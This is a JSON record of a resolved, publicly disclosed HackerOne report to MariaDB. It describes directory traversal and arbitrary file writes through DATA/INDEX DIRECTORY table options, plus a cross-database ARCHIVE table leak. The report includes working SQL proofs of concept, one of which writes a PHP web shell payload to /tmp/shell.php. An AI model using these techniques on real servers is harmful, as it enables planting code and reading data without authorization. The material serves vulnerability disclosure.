@@ -1,0 +1,103 @@
+{
+  "id": 3849025,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODQ5MDI1",
+  "url": "https://hackerone.com/reports/3849025",
+  "title": "DATA / INDEX DIRECTORY Abuse",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-07T17:05:52.197Z",
+  "submitted_at": "2026-07-07T17:05:52.299Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vortfu",
+    "url": "/vortfu",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-102523"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-07T19:53:07.386Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-09-07T19:52:57.683Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "A user with ordinary schema-level privileges (`SELECT`, `INSERT`, `CREATE` etc, but no global `FILE` privilege) may be able to coerce MariaDB into writing (almost) arbitrary data into attacker chosen locations by abusing issues with how a table's `DATA DIRECTORY` or `INDEX DIRECTORY` values are used.\n\n\n# Basic Overview\n\n```sql\nSELECT VERSION(), @@have_symlink;\n-- 13.1.0-MariaDB, YES\n\nSELECT '<?php system(\"uname -a && id\");' INTO OUTFILE '/tmp/shell.php';\n-- ERROR 1227 (42000): Access denied; you need (at least one of) the FILE privilege(s)\n\n\n-- InnoDB\n--   - only supports `DATA DIRECTORY`\n--   - will create any missing directories automagically\n--   - will write to `<directory>/<db>/<table>.idb`\n\nCREATE TABLE poc_innodb(a INT)\n  ENGINE=InnoDB\n  DATA DIRECTORY='/tmp/poc';\n\n-- creates:\n--   /tmp/poc/testdb/poc_innodb.ibd\n\n-- ====================================================== --\n\n-- MyISAM / Aria\n--   - supports both `DATA` and `INDEX DIRECTORY`\n--   - data / index directories must already exists\n--   - will write to `<directory>/<table>.<ext>`\n\nCREATE TABLE poc_myisam(a INT KEY)\n  ENGINE=MyISAM\n  DATA DIRECTORY='/tmp/poc'\n  INDEX DIRECTORY='/tmp/poc';\n\n-- creates:\n--   /tmp/poc/poc_myisam.MYD\n--   /tmp/poc/poc_myisam.MYI\n\n\nCREATE TABLE poc_aria(a INT)\n  ENGINE=Aria\n  DATA DIRECTORY='/tmp/poc'\n  INDEX DIRECTORY='/tmp/poc';\n\n-- creates:\n--   /tmp/poc/poc_aria.MAD\n--   /tmp/poc/poc_aria.MAI\n```\n\n**Note:** target directories must be writable by the mariadbd process and table related filenames cannot already exist.\n\nAll good so far - no real surprises.\n\n\n# Directory Traversal\n\nWhile valid table names may contain path components such as `/` and `.`, normal table file paths get built with `build_table_filename()` which uses `tablename_to_filename()` to sanitize both the database and table names.\n\n[server/sql/sql_table.cc:586](https://github.com/MariaDB/server/blob/dcb8fdc739c30622928f4d17fdef54f6dfbd34e6/sql/sql_table.cc#L586-L634)\n```c++\nuint build_table_filename(char *buff, size_t bufflen, const char *db,\n                          const char *table_name, const char *ext, uint flags)\n{\n  char dbbuff[FN_REFLEN];\n  char tbbuff[FN_REFLEN];\n\n  (void) tablename_to_filename(db, dbbuff, sizeof(dbbuff));\n  ...\n\n  if (flags & FN_IS_TMP)\n    strmake(tbbuff, table_name, sizeof(tbbuff)-1);\n  else\n    (void) tablename_to_filename(table_name, tbbuff, sizeof(tbbuff));\n  ...\n}\n```\n\nThe path seems to be different for tables with external directories. During `CREATE TABLE` MariaDB calls `append_file_to_dir()` on `create_info.data_file_name` and `create_info.index_file_name` to add the table name directly without using `tablename_to_filename()`.\n\n[sql/sql_table.cc:13632](https://github.com/MariaDB/server/blob/dcb8fdc739c30622928f4d17fdef54f6dfbd34e6/sql/sql_table.cc#L13631-L13636)\n```c++\n/* Fix names if symlinked or relocated tables */\nif (append_file_to_dir(thd, &create_info.data_file_name,\n                       &create_table->table_name) ||\n    append_file_to_dir(thd, &create_info.index_file_name,\n                       &create_table->table_name))\n  goto end_with_restore_list;\n```\n\ne.g.\n\n```sql\nCREATE TABLE `../../../../tmp/poc_myisam`(a INT)\n  ENGINE=MyISAM;\n\n-- created:\n--   /var/lib/mysql/testdb/@002e@002e@002f@002e@002e@002f@002e@002e@002f@002e@002e@002ftmp@002fpoc_myisam.MYD\n\nCREATE TABLE `../../../tmp/poc_myisam`(a INT)\n  DATA DIRECTORY='/tmp/foo/bar'\n  ENGINE=MyISAM;\n\n-- created:\n--   /tmp/poc_myisam.MYD\n--\n-- instead of:\n--   /tmp/foo/bar/@002e@002e@002f@002e@002e@002f@002e@002e@002ftmp@002fpoc_myisam.MYD\n```\n\nWhile the above example could have just used `DATA DIRECTORY='/tmp'` to achieve the same thing, it does highlight that table data may end up living outside of the originally defined directories.\n\nInnoDB fairs a little better.\n\n```sql\nCREATE TABLE `../../../tmp/poc_innodb`(a INT)\n  DATA DIRECTORY='/tmp/foo/bar'\n  ENGINE=InnoDB;\n\n-- created:\n--   /tmp/testdb/@002e@002e@002f@002e@002e@002f@002e@002e@002ftmp@002fpoc_innodb.ibd\n--\n-- instead of:\n--   /tmp/foo/bar/testdb/@002e@002e@002f@002e@002e@002f@002e@002e@002f@002e@002e@002f@002e@002e@002ftmp@002fpoc_innodb.idb\n```\n\n\n# Directory Traversal into Restricted Directories\n\nAfter the raw table name is appended to `create_info.data_file_name` / `index_file_name`, it is later checked to ensure that the files are actually external to the normal data directories.\n\n[sql/sql_table.cc:4691](https://github.com/MariaDB/server/blob/dcb8fdc739c30622928f4d17fdef54f6dfbd34e6/sql/sql_table.cc#L4691-L4696)\n```c++\nif (unlikely(error_if_data_home_dir(create_info->data_file_name,\n                                    \"DATA DIRECTORY\")) ||\n    unlikely(error_if_data_home_dir(create_info->index_file_name,\n                                    \"INDEX DIRECTORY\")) ||\n    unlikely(check_partition_dirs(thd->lex->part_info)))\n  goto err;\n```\n\n[sql/sql_parse.cc:10268](https://github.com/MariaDB/server/blob/main/sql/sql_parse.cc#L10268-L10273)\n```c++\nint error_if_data_home_dir(const char *path, const char *what)\n{\n  ...\n  dirname_part(dirpath, path, &dirlen);\n  if (test_if_data_home_dir(dirpath))\n  {\n    my_error(ER_WRONG_ARGUMENTS, MYF(0), what);\n    return 1;\n  }\n  ...\n```\n\n`test_if_data_home_dir()` > `fn_format(..., MY_RETURN_REAL_PATH)` > `my_realpath()`\n\n[mysys/my_symlink.c:157](https://github.com/MariaDB/server/blob/dcb8fdc739c30622928f4d17fdef54f6dfbd34e6/mysys/my_symlink.c#L157-L177)\n```c++\nint my_realpath(char *to, const char *filename, myf MyFlags)\n{\n  ...\n  if ((ptr=realpath(filename[0] ? filename : cur_dir, buff)))\n    strmake(to, ptr, FN_REFLEN-1);\n  else\n  {\n    /*\n      Realpath didn't work;  Use my_load_path() which is a poor substitute\n      original name but will at least be able to resolve paths that starts\n      with '.'.\n    */\n    ...\n    my_load_path(to, filename, NullS);\n    ...\n```\n\nThus if the table data path contains segments that don't exist, `realpath()` will fail and `my_realpath()` falls back to using `my_load_path()` - causing the `error_if_data_home_dir()` checks to pass and allowing traversal into restricted directories.\n\n## Proof of Concept\n\n```sql\nSELECT @@datadir;\n-- /var/lib/mysql\n\n\nCREATE TABLE `../../var/lib/mysql/poc_myisam_datadir`(a INT KEY)\n  ENGINE=MyISAM\n  DATA DIRECTORY='/tmp/poc';\n\n-- ERROR 1210 (HY000): Incorrect arguments to DATA DIRECTORY\n\n\nCREATE TABLE `../../../var/lib/mysql/poc_myisam_datadir`(a INT KEY)\n  ENGINE=MyISAM\n  DATA DIRECTORY='/tmp/poc/does-not-exist-myisam';\n\n-- creates:\n--   /var/lib/mysql/poc_myisam_datadir.MYD\n-- \n-- instead of attempting to use the following (and then failing because `does-not-exist-myisam` doesn't exist?):\n--   /tmp/poc/does-not-exist-myisam/[encoded]poc_myisam_datadir.MYD\n-- \n-- **note:** the table is not useable after creation\n-- \n-- INSERT ...\n-- ERROR 1030 (HY000): Got error 140 \"Wrong create options\" from storage engine MyISAM\n```\n\nInnoDB behaves in a similar matter, will create `/tmp/poc/does-not-exist-innodb` and create `/var/lib/mysql/testdb/@002e@002e@002f@002e@002e@002f@002e@002e@002ftmp@002fmariadb@002drelease@002e72mrpw@002fdata@002fpoc_innodb_datadir.ibd` ... but that doesn't seem to have much advantage :shrug:\n\nJust using `/proc/self/cwd/foobar` might also work under linux?\n\nWhat's more interesting is ...\n\n\n# Arbitrary Table Data Filenames\n\nWhen the `data_file_name` / `index_file_name` values get passed to the storage engines for creation, they are reformatted into their final filenames (file extensions get added etc) with something like the following:\n\n[storage/myisam/mi_create.c:677](https://github.com/MariaDB/server/blob/dcb8fdc739c30622928f4d17fdef54f6dfbd34e6/storage/myisam/mi_create.c#L677-L679)\n```c++\nfn_format(dfilename, ci->data_file_name, \"\", MI_NAME_DEXT,\n          MY_UNPACK_FILENAME |\n          (have_dext ? MY_REPLACE_EXT : MY_APPEND_EXT));\n```\n\nThe problem is that if `data_file_name` happens to be large enough (508-511), `fn_format()` won't append the extension because the length of the new filename would be `>= FN_REFLEN` (512) and the original file name, which may already contain some other extension, will be used instead.\n\n[mysys/mf_format.c:79](https://github.com/MariaDB/server/blob/dcb8fdc739c30622928f4d17fdef54f6dfbd34e6/mysys/mf_format.c#L79-L89)\n```c++\nchar * fn_format(char * to, const char *name, const char *dir,\n\t\t    const char *extension, uint flag)\n{\n  ...\n  if (strlen(dev)+length+strlen(ext) >= FN_REFLEN || length >= FN_LEN )\n  {\n    /* To long path, return original or NULL */\n    size_t tmp_length;\n    if (flag & MY_SAFE_PATH)\n      DBUG_RETURN(NullS);\n    tmp_length= strlength(startpos);\n    DBUG_PRINT(\"error\",(\"dev: '%s'  ext: '%s'  length: %u\",dev,ext,\n                        (uint) length));\n    (void) strmake(to,startpos,MY_MIN(tmp_length,FN_REFLEN-1));\n  }\n  ...\n```\n\n> Unrelated: there is a typo above in comment `/* To long ... */`)\n\nWhile being able to create table files in a long path with arbitrary extensions might already be beneficial to an attacker, it doesn't allow for arbitrary file placement directly (_I haven't checked symlink based attacks_) because `cleanup_dirname()` is called before this to normalize the path and resolve potential directory traversal issues ... except this can be bypassed in two separate ways.\n\n[mysys/mf_pack.c:197](https://github.com/MariaDB/server/blob/dcb8fdc739c30622928f4d17fdef54f6dfbd34e6/mysys/mf_pack.c#L197-L204)\n```c++\nsize_t cleanup_dirname(register char *to, const char *from)\n{\n  ...\n  if (pos[1] == FN_HOMELIB ||\n     (pos >= start && memcmp(pos, parent, length) == 0))\n  {\t\t\t\t\t/* Don't remove ~user/ */\n    pos=strmov(end_parentdir+1,parent);\n    *pos=FN_LIBCHAR;\n    continue;\n  }\n  ...\n```\n\nPaths that start with multiple `/..` segments or those that contain `~foobar/../../..` do not get handled correctly by `cleanup_dirname()`. This allows an attacker to keep the internal filename that MariaDB is using artificially long enough such that the storage engine does not append its own extensions, while the OS resolves the filename somewhere shorter.\n\n## Proof of Concept\n\n```sql\nSET @target  = '/tmp/shell.php';\nSET @payload = '<?php system( \"uname -a && id\" );';\n\nSELECT SUBSTRING_INDEX(@target, '/', -1) INTO @tbl;\nSELECT CONCAT(REPEAT('/..', FLOOR((511 - LENGTH(@target)) / 3)), LEFT(@target, LENGTH(@target) - LENGTH(@tbl) - 1)) INTO @dir;\nSELECT CONCAT(\"CREATE TABLE `\", @tbl, \"`(payload CHAR(\", LENGTH(@payload), \") CHARACTER SET binary NOT NULL) ENGINE=MyISAM DATA DIRECTORY='\", @dir, \"'\") INTO @sql;\nPREPARE tbl_create FROM @sql;\nEXECUTE tbl_create;\n\n-- % ls -la /tmp/shell.php\n-- -rw-rw----@ 1 vortfu  wheel  0 Jun 30 14:22 /tmp/shell.php\n\nSELECT CONCAT('INSERT INTO `', @tbl, '` VALUES (BINARY(?))') INTO @sql;\nPREPARE tbl_insert FROM @sql;\nEXECUTE tbl_insert USING @payload;\n\n-- % hexdump -C /tmp/shell.php\n-- 00000000  ff 3c 3f 70 68 70 20 73  79 73 74 65 6d 28 20 22  |.<?php system( \"|\n-- 00000010  75 6e 61 6d 65 20 2d 61  20 26 26 20 69 64 22 20  |uname -a && id\" |\n-- 00000020  29 3b                                             |);|\n-- 00000022\n```\n\nOne little leading `0xff` byte away from completely arbitrary file contents ... but it is still enough to cause problems depending on what can be written where :)\nDifferent engines / field types may provide different row framing bytes depending on the attacker's actual need.\n\n\n# (BONUS BUG) ARCHIVE Table Data File Overwrite / Deletion\n\nThe optional `ARCHIVE` storage engine somewhat extends the above `DATA DIRECTORY` issues because it opens the target data file with `O_CREAT|O_RDWR` and no `O_EXCL` or `O_TRUNC` before immediately rewriting the archive header.\n\n[storage/archive/ha_archive.cc:840](https://github.com/MariaDB/server/blob/bd366d81b80aa65fc76ec570fa0bf218a996853b/storage/archive/ha_archive.cc#L840-L849)\n```c++\nif (my_use_symdir &&\n    create_info->data_file_name &&\n    create_info->data_file_name[0] != '#')\n{\n  fn_format(name_buff, create_info->data_file_name, \"\", ARZ,\n            MY_REPLACE_EXT | MY_UNPACK_FILENAME);\n  fn_format(linkname, name, \"\", ARZ,\n            MY_REPLACE_EXT | MY_UNPACK_FILENAME);\n}\n...\n\n/*\n  There is a chance that the file was \"discovered\". In this case\n  just use whatever file is there.\n*/\nmy_errno= 0;\nif (!(azopen(&create_stream, name_buff, O_CREAT|O_RDWR|O_BINARY)))\n  ...\n```\n\nWhile we can't target arbitrary files to create / overwrite because the archive filename will replace the extension with `.ARZ`, we can use the above long `DATA DIRECTORY` trick to target extensionless files. They can then be overwritten or deleted when the table is dropped.\n\nIf overwriting an existing ARCHIVE file, it's possible to leak data without access.\n\n\n## Proof of Concept\n\n**Note:** the following poc targets a cross db leak between ARCHIVE tables. If targeting tables in the same db you might need to use the arbitrary table files bug above and access the data via `<table>.arz` instead. I didn't test.\n\n```sql\nUSE victimdb;\n\nCREATE TABLE `secret` (data CHAR(255) CHARACTER SET binary NOT NULL) ENGINE=ARCHIVE DATA DIRECTORY='/tmp/poc' COMMENT='foo';\nINSERT INTO `secret` VALUES ('secret 1'),('secret 2'),('secret 3');\nSELECT * FROM `secret`;\n-- secret 1\n-- secret 2\n-- secret 3\n```\n\n```sql\nUSE testdb;\n\nSELECT * FROM `victimdb`.`secret`;\n-- ERROR 1142 (42000): SELECT command denied to user 'vortfu'@'localhost' for table `victimdb`.`secret`\n\nCREATE TABLE `secret` (data CHAR(255) CHARACTER SET binary NOT NULL) ENGINE=ARCHIVE DATA DIRECTORY='/tmp/poc' COMMENT='foo';\nSELECT * FROM `secret`;\n-- Empty set (0.011 sec)\n\nINSERT INTO `secret` VALUES ('test 1'), ('test 2');\nSELECT * FROM `secret`;\n-- secret 1\n-- secret 2\n\nINSERT INTO `secret` VALUES ('test 3'), ('test 4'), ('test 5');\nSELECT * FROM `secret`;\n-- secret 1\n-- secret 2\n-- secret 3\n```\n\nNote: new rows inserted into `secret` may crash the table ...\n\nIf the table definitions DON'T match, it tends to stay alive (for a while at least) but turns into a black hole from both sides.\n\n```sql\nINSERT INTO `secret` values ('foobar');\n-- Query OK, 1 row affected (0.000 sec)\n\nSELECT * FROM `secret`;\n-- Empty set (0.008 sec)\n```\n\nApologies for the long read :)\n\n## Impact\n\nDescribe impact here.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-07T19:52:58.463Z",
+  "allow_singular_disclosure_after": -4570.973533532,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "inzamulsepoy"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
